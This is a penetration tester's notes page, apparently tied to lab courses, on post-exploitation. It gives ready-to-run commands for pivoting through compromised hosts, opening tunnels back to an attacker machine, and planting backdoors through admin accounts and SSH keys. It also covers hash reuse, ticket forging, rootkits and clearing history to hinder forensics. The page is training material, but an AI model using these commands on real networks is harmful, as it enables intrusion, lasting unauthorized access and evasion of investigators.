# Final step - Post-exploitation

<div class="row row-cols-lg-2"><div>

Post-exploitation ‚úàÔ∏è is the last step of the pentester activities. Once we got access to the target, and escalated to administrator, we are trying to **maintain** and **expand** our access to other machines.

Pivoting to another victim is called **lateral movement** üîì. Target high-value hosts such as SQL or Microsoft Exchange servers.
</div><div>

**Common activities** ü§ñ

* üö™ Leave a backdoor (persistence)
* üôä Deface the public website
* üï∏Ô∏è Redirect users to a malicious website/server
* üí∞ Stealing data <small>(files, photos, emails, source code...)</small>
* üîë Stealing credentials <small>(authentication tokens, password, keepass)</small>
* üåã Mess with timestamp/... to complicate forensics
* üßπ Cleanup logs
* ‚å®Ô∏è installing keyloggers
* üß® Edit software configurations/users permissions
* üê≤ Reset user passwords to access their account
</div></div>

<hr class="sep-both">

## Pivoting To Another Host ‚úàÔ∏è

<div class="row row-cols-lg-2"><div>

#### Basic Pivoting Overview

[![pivoting_tunneling_port_forwarding](../../_badges/htb/pivoting_tunneling_port_forwarding.svg)](https://academy.hackthebox.com/course/preview/pivoting-tunneling-and-port-forwarding)

If a host has more than one network adapter (`ip a`, `ifconfig`, `ipconfig`), we may be able to use it to move to another network.

We will assume that we have the following hosts, and we want to reach `C` from `A` using `B` as the pivot host.

```yaml!
A: ["10.10.14.10"]                  # 10.10.10.0/8
B: ["10.10.14.100", "172.16.5.100"] # 10.10.10.0/8, 172.16.5.0/8
C: ["172.16.5.5", "172.16.10.5"]    # 172.16.5.0/8, 172.16.10.0/8
D: ["172.16.10.10"]                 # 172.16.10.0/8
```

We may use:

* **Tunneling** üì¶: we encapsulate data within another protocol. We mostly see SSH <small>(or DNS, ICMP, and RDP)</small> and TCP forwarding.
* **Port forwarding** üõ£Ô∏è: we use an agent listening between our host and the target, and forwarding message from one to the other.

Once we detect another network, we often want to find hosts. We can perform a [ping sweep](/cybersecurity/red-team/s2.discovery/techniques/network/ping.md). For instance, with ping:

```shell!
$ for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
cmd> for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
PS> 1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

<br>

#### TCP Forwarder ‚Äî socat

[![pivoting_tunneling_port_forwarding](../../_badges/htb/pivoting_tunneling_port_forwarding.svg)](https://academy.hackthebox.com/course/preview/pivoting-tunneling-and-port-forwarding)

Refer to [socat](/cybersecurity/red-team/s3.exploitation/shell/tools/socat.md) notes. For instance, to allow ligolo agent traffic on host C to reach host A, you can forward TCP traffic on B using:

```shell!
$ socat TCP-LISTEN:11601,fork TCP:10.10.14.10:11601
```

<br>

#### SSH Port forwarding ‚Äî SSH Command

[![pivoting_tunneling_port_forwarding](../../_badges/htb/pivoting_tunneling_port_forwarding.svg)](https://academy.hackthebox.com/course/preview/pivoting-tunneling-and-port-forwarding)

To access `172.16.5.5:3306`, you can now use the port `localhost:3389`.

```ps
$ # local_port:target:target_port
$ ssh -L 3389:172.16.5.5:3389 [...]
```

We can also perform reverse port forwarding, by allowing the target to connect back to a port open on our machine. Below, if any target requests the port `8880` on the jump host we are connected to, then the request will be forwarded to us at `0.0.0.0:8080`.

```ps
$ # jump_host:jump_port:our_host:our_port
$ # 0.0.0.0 is a wilcard == listen on every interface
$ # could have been: 172.16.5.100:8880:10.10.14.10:8080
$ ssh -vN -R 0.0.0.0:8880:0.0.0.0:8080 [...]
```

üìö You may use `-T` <small>(No TTY)</small> and `-N` <small>(no remote command)</small> and `-f` <small>(&)</small>.

<br>

#### SSH Tunneling ‚Äî SOCKS proxy

[![pivoting_tunneling_port_forwarding](../../_badges/htb/pivoting_tunneling_port_forwarding.svg)](https://academy.hackthebox.com/course/preview/pivoting-tunneling-and-port-forwarding)

We can use [SOCKS](/operating-systems/networking/protocols/socks.md) to make it easier to interact with the target. It allows us to use dynamic port forwarding.

```ps
$ ssh -D 9050 username@10.10.14.100
```

<br>

#### SSH Tunneling ‚Äî Linux Sockets

[![docker_talk_through_me](../../_badges/rootme/app_script/docker_talk_through_me.svg)](https://www.root-me.org/en/Challenges/App-Script/Docker-Talk-through-me)

We can use SSH to tunnel Unix sockets such as docker socket:

```ps
$ ssh -L /tmp/docker.sock:/var/run/docker.sock
$ # and use /tmp/docker.sock
```

<br>

#### SSH Tunneling ‚Äî sshuttle

[![pivoting_tunneling_port_forwarding](../../_badges/htb/pivoting_tunneling_port_forwarding.svg)](https://academy.hackthebox.com/course/preview/pivoting-tunneling-and-port-forwarding)

[sshuttle](https://github.com/sshuttle/sshuttle) <small>(11.7k ‚≠ê)</small>, we can dynamically access any port of a network:

```shell!
$ sudo apt install -y sshuttle
$ sshuttle -r username@10.10.14.100 172.16.5.0/24
```

‚ö†Ô∏è This tool doesn't support UDP, requires sudo locally, and doesn't support well nmap scans, but it's easy to set up.

<br>

#### Metasploit Tunneling ‚Äî SOCKS proxy

[![pivoting_tunneling_port_forwarding](../../_badges/htb/pivoting_tunneling_port_forwarding.svg)](https://academy.hackthebox.com/course/preview/pivoting-tunneling-and-port-forwarding)

Refer to [SOCKS](/operating-systems/networking/protocols/socks.md) proxy notes.

<br>

#### Metasploit Port Forwarding ‚Äî Meterpreter

[![pivoting_tunneling_port_forwarding](../../_badges/htb/pivoting_tunneling_port_forwarding.svg)](https://academy.hackthebox.com/course/preview/pivoting-tunneling-and-port-forwarding)

Assuming your meterpreter for your current target can use `portfwd`:

```shell!
meterpreter> portfwd add -R -l 8080 -p 8880 -L 0.0.0.0 # doesn't work much
meterpreter> portfwd add -l lport -p port -r target # access target:port
```

<br>

#### SSH Port Forwarding/Tunneling ‚Äî PuTTY Link

[![pivoting_tunneling_port_forwarding](../../_badges/htb/pivoting_tunneling_port_forwarding.svg)](https://academy.hackthebox.com/course/preview/pivoting-tunneling-and-port-forwarding)

[PuTTY](https://putty.org/) may be installed on some hosts. Refer to the SSH sections for references on what you can do. For instance:

```shell!
PS> # assuming you are Host A and running Windows
PS> plink -ssh -D 9050 username@10.10.14.100
```

After setting up a proxy server on host A to forward all requests to `localhost:9050`, you can use RDP from host A to access `172.16.5.5`.

<br>

#### TCP Port Forwarding ‚Äî Netsh

[![pivoting_tunneling_port_forwarding](../../_badges/htb/pivoting_tunneling_port_forwarding.svg)](https://academy.hackthebox.com/course/preview/pivoting-tunneling-and-port-forwarding)

If our jump host B is running Windows, we can use `netsh` to forward all traffic received on port `13389` to `172.16.5.5:3389`.

```ps
PS> netsh.exe interface portproxy add v4tov4 listenport=13389 listenaddress=0.0.0.0 connectport=3389 connectaddress=172.16.5.5
PS> netsh.exe interface portproxy show v4tov4 # show
PS> netsh interface portproxy delete v4tov4 listenport=13389 listenaddress=0.0.0.0 # delete
```
</div><div>

#### DNS Tunneling ‚Äî Dnscat2

[![pivoting_tunneling_port_forwarding](../../_badges/htb/pivoting_tunneling_port_forwarding.svg)](https://academy.hackthebox.com/course/preview/pivoting-tunneling-and-port-forwarding)

[dnscat2](https://github.com/iagox86/dnscat2) <small>(3.4k ‚≠ê, 2021 ü™¶)</small> is a tunneling tool wrapping data within TXT records of DNS requests. Refer to [ruby notes](/programming-languages/high-level/scripting/ruby/index.md) for installation notes.

```shell!
$ DEST="$HOME/tools/dnscat2"
$ git clone -b "master" https://github.com/iagox86/dnscat2.git $DEST
$ bundle install --gemfile $DEST/server/Gemfile
$ ruby $DEST/dnscat2.rb --dns host=10.10.14.10,port=53,domain=example.com --no-cache
dnscat2> window -i 1 # on client connected
```

You can use their client or [dnscat2.ps1](https://github.com/lukebaggett/dnscat2-powershell) <small>(0.4k ‚≠ê, 2023 ü™¶)</small>.

```ps
PS> Import-Module .\dnscat2.ps1
PS> Start-Dnscat2 -DNSserver 10.10.14.10 -Domain example.com -PreSharedSecret XXX -Exec cmd
```

<br>

#### DNS Tunneling ‚Äî iodine

[iodine](https://github.com/yarrick/iodine) <small>(6.2k ‚≠ê)</small> is a tunneling tool.

<br>

#### TCP Tunneling ‚Äî rpivot SOCKS proxy

[![pivoting_tunneling_port_forwarding](../../_badges/htb/pivoting_tunneling_port_forwarding.svg)](https://academy.hackthebox.com/course/preview/pivoting-tunneling-and-port-forwarding)

[rpivot](https://github.com/klsecservices/rpivot) <small>(0.6k ‚≠ê, 2018 ü™¶)</small> is a python2 SOCKS proxy over TCP. It's slow.

```ps
$ DEST="$HOME/tools/rpivot"
$ git clone -b "master" https://github.com/klsecservices/rpivot.git $DEST
$ python2.7 $DEST/server.py --proxy-port 9050 --server-port 1234 --server-ip 0.0.0.0
```

Upload `*.py ntlm_auth` to the target host and run:

```ps
$ python2.7 client.py --server-ip 10.10.14.10 --server-port 9999
$ # can authenticate to a proxy server if needed
```

<br>

#### TCP Tunneling ‚Äî Ligolo-ng

[Ligolo-ng](https://github.com/Nicocha30/ligolo-ng) <small>(2.8k ‚≠ê)</small> is a simple and powerful fork of [ligolo](https://github.com/sysdream/ligolo) <small>(1.7k ‚≠ê)</small>. On our host, we need to configure a network interface:

```shell!
$ sudo apt install -y ligolo-ng
$ ligolo-proxy -selfcert # in another terminal, run:
$ sudo ip tuntap add user $USER mode tun ligolo
$ sudo ip link set ligolo up
$ sudo ip route add 172.16.5.0/24 dev ligolo # example
$ sudo ip tuntap delete ligolo mode tun # once you're done
```

On the target, download an agent and run it:

```ps
$ wget "https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_windows_amd64.zip"
$ wget "https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_linux_amd64.tar.gz"
$ ./agent -connect 10.10.14.10:11601 -ignore-cert
```

On our proxy server, we can start the tunneling. Now, we can smoothly send traffic to ligolo by defining routes and using them.

```shell!
ligolo> sessions # pick one
ligolo> start # try: ping 172.16.5.5
ligolo> start --tun ligolo2 # one interface per agent
```

<br>

#### TCP Port Forwarding/Tunneling ‚Äî chisel

[![pivoting_tunneling_port_forwarding](../../_badges/htb/pivoting_tunneling_port_forwarding.svg)](https://academy.hackthebox.com/course/preview/pivoting-tunneling-and-port-forwarding)

[Chisel](https://github.com/jpillora/chisel) <small>(13.2k ‚≠ê)</small> is often used to quickly set up TCP port forwarding. It's using HTTP and SSH, and can be used for tunneling <small>(socks)</small>.

```shell!
$ sudo apt install chisel
$ chisel server -p 1234 --reverse
$ chisel server -p 1234 --reverse --socks5
```

On the jump host, [download the binary](https://github.com/jpillora/chisel/releases/) and run:

```shell!
$ wget "https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz"
$ gunzip xxx.gz
$ # Ex: localhost:8080 will point to 172.16.5.5:80
$ ./chisel client 10.10.14.10:1234 R:8080:172.16.5.5:80
$ ./chisel client 10.10.14.10:1234 R:socks
```

In some scenarios, we can use the pivot as the server, and connect back to the pivot, but most of the time, there is a firewall.

```shell!
$ chisel server -p 1234 --socks5
$ chisel client 10.10.14.100:1234 socks
```

<br>

#### ICMP Tunneling ‚Äî ptunnel-ng

[![pivoting_tunneling_port_forwarding](../../_badges/htb/pivoting_tunneling_port_forwarding.svg)](https://academy.hackthebox.com/course/preview/pivoting-tunneling-and-port-forwarding)

We can use [ptunnel-ng](https://github.com/utoni/ptunnel-ng) <small>(0.4k ‚≠ê)</small> to tunnel traffic over ICMP. It requires that the target is able to reply to our host <small>(try ping on both sides)</small>.

```shell!
$ sudo apt install -y ptunnel-ng
$ git clone https://github.com/utoni/ptunnel-ng.git
$ cd ptunnel-ng && sudo ./autogen.sh
```

You need to upload `ptunnel-ng` to the pivot host `B`. Then, run:

```shell!
$ sudo ./ptunnel-ng -r10.10.14.100 -R22 # Ex: 10.10.14.100:22 is behind firewall
```

Back on our host, we can access it at `127.0.0.1:22` using:

```shell!
$ sudo ptunnel-ng -p10.10.14.100 -l2222 -r10.10.14.100 -R22
```

<br>

#### RDP Tunneling ‚Äî SocksOverRDP

[![pivoting_tunneling_port_forwarding](../../_badges/htb/pivoting_tunneling_port_forwarding.svg)](https://academy.hackthebox.com/course/preview/pivoting-tunneling-and-port-forwarding)

[SocksOverRDP](https://github.com/nccgroup/SocksOverRDP) <small>(1.1k ‚≠ê, 2022 ü™¶)</small> can be used on a Windows host to create a tunnel with another Windows host. It uses Dynamic Virtual Channels (DVC). First, disable AV and as administrator, run:

```shell!
PS> regsvr32.exe SocksOverRDP-Plugin.dll # Download it and put it in the current folder of host A
PS> mstsc.exe # RDP to host B
hostb> .\SocksOverRDP-Server.exe
PS> netstat -antb | findstr 1080 # (still admin, should show one line)
```

You can access internal hosts such as host C using `localhost:1080`.

<br>

#### Additional Pivoting Tools

Thanks to noraj for their [article](https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/).

* [cloudflared](https://github.com/cloudflare/cloudflared) <small>(9.1k ‚≠ê)</small>
* [Tunna](https://github.com/SECFORCE/Tunna) <small>(1.2k ‚≠ê, python TCP port forwarding using HTTP)</small>
* [PivotSuite](https://github.com/RedTeamOperations/PivotSuite) <small>(0.4k ‚≠ê, python TCP port forwarding)</small>
* [reGeorg](https://github.com/sensepost/reGeorg) <small>(3.0k ‚≠ê, 2017 ü™¶, TCP port forwarding using HTTP)</small> + [CN fork](https://github.com/L-codes/Neo-reGeorg/)
</div></div>

<hr class="sep-both">

## Windows Post-exploitation

<div class="row row-cols-lg-2"><div>

#### üí∞ Stealing data/credentials on Windows üîë

You can hunt for more [secrets](/cybersecurity/red-team/s4.privesc/index.md#credential-hunting) now that you have more privileges, but the process is the same.

You can refer to [Windows Pentester Notes](/operating-systems/windows/security/index.md#windows-pentester-notes-) to dump the the SAM database, DPAPI keys, Kerberos tickets, etc.

üìö As administrator, use `HKEY_USERS` instead of `HKEY_CURRENT_USER`.

<br>

#### üö™ Leave a backdoor on Windows

[![adventofcyber2](../../_badges/thm/adventofcyber2/day11.svg)](https://tryhackme.com/room/adventofcyber2)

Create a new local user.

```ps
PS> net user <username> <password> /add
```

Add a user in the local administrator group.

```ps
PS> net localgroup administrators <username> /add
```

For active directory commands, refer to [this](/cybersecurity/red-team/s4.privesc/windows/topics/privs.md#windows-dangerous-aces).
</div><div>

#### üß® Windows Edit software configurations

[![windows_privilege_escalation](../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)

On hosts connected to active directory, folders such as `%APPDATA%` are shared between machines. If we add a program in `USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup`, then it will be executed when the users log in.

<br>

#### üîì Lateral Movement - Administrator Password Reuse

[![active_directory_enumeration_attacks](../../_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)

We can use [crackmapexec](/cybersecurity/red-team/tools/cracking/auth/cme.md)/[nxc](/cybersecurity/red-team/tools/cracking/auth/nxc.md) to test the administrator hash or password on many hosts.

```ps
$ nxc smb --local-auth CIDR -u administrator -H hash
```

If LAPS was implemented, refer to [LAPS](/operating-systems/windows/security/index.md#microsoft-local-administrator-password-solution-laps).

<br>

#### üîì Lateral Movement - Find Interesting Users/Groups

Refer to [LDAP](/operating-systems/networking/protocols/ldap.md).

<br>

#### üîì Lateral Movement - Golden/Silver Ticket

[![golden_ticket](../../_badges/hacktricks/windows_hardening/active_directory_methodology/golden_ticket.svg)](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket)
[![silver_ticket](../../_badges/hacktricks/windows_hardening/active_directory_methodology/silver_ticket.svg)](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket)

A golden ticket is a forged ticket (TGT) created using the KRBTGT account NTLM password hash, and the information we want <small>(ex: expire in 10 years, associated with account XXX even if disabled/deleted, etc.)</small>.

A silver ticket is a forged ticket (TGS) created using the target service account password hash. It's similar to a golden ticket aside from the fact that it only grants access to one service.
</div></div>

<hr class="sep-both">

## Linux Post-exploitation

<div class="row row-cols-lg-2"><div>

#### üö™üß® Create or edit user privileges on Linux

[![linuxfilesystemanalysis](../../_badges/thm/linuxfilesystemanalysis.svg)](https://tryhackme.com/r/room/linuxfilesystemanalysis)

* Add a user with uid 0
* Add your user in special groups <small>(shadow, disk, root)</small>
* Edit `/etc/sudoers`

<br>

#### üåã Complicate forensics on Linux

[![linuxfilesystemanalysis](../../_badges/thm/linuxfilesystemanalysis.svg)](https://tryhackme.com/r/room/linuxfilesystemanalysis)

* Remove or edit the shell history file <small>(.bash_history?)</small>
</div><div>

#### üö™ Leave a backdoor on Linux

[![linuxfilesystemanalysis](../../_badges/thm/linuxfilesystemanalysis.svg)](https://tryhackme.com/r/room/linuxfilesystemanalysis)
[![unbakedpie](../../_badges/thm-p/unbakedpie.svg)](https://tryhackme.com/r/room/unbakedpie)
[![teamcw](../../_badges/thm-p/teamcw.svg)](https://tryhackme.com/r/room/teamcw)
[![h4cked](../../_badges/thm-p/h4cked.svg)](https://tryhackme.com/r/room/h4cked)

* Add your SSH key in `[...]/.ssh/authorized_keys`

```ps
$ ssh-keygen -f mykey
$ mkdir -p $TARGET_USER_HOME/.ssh
$ cp mykey.pub $TARGET_USER_HOME/.ssh/authorized_keys
$ chmod 777 $TARGET_USER_HOME/.ssh/authorized_keys
$ ssh target@0 -i mykey
```

* A rootkit is a set of tools used to maintain a high level of privileges on an host by infecting system files. They can be detected using [chkrootkit](https://www.chkrootkit.org/) <small>(simple checks)</small> or [Rootkit Hunter](https://rkhunter.sourceforge.net/) <small>(use an online database)</small>

You can use [Reptile](https://github.com/f0rb1dd3n/Reptile) <small>(2.6k ‚≠ê)</small>.
</div></div>

<hr class="sep-both">

## üëª To-do üëª

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

Windows

* See also VSS

Linux

* üö™ You can give capabilities to a file with `setcap`
* SSH key
</div><div>

* Passive attacks (monitor)
* Active attacks
* Meterpreter
* /.dockerenv (check if we are in a docker)
* KeePass (see exploitation note too?)
* Vulnerable security questions (unencrypted, easy to guess, reset passwords)
* Pass-The-Hash Attack
* rootkit, bootkit
* Credential dumping
* Forensics: clear PowerShell history
</div></div>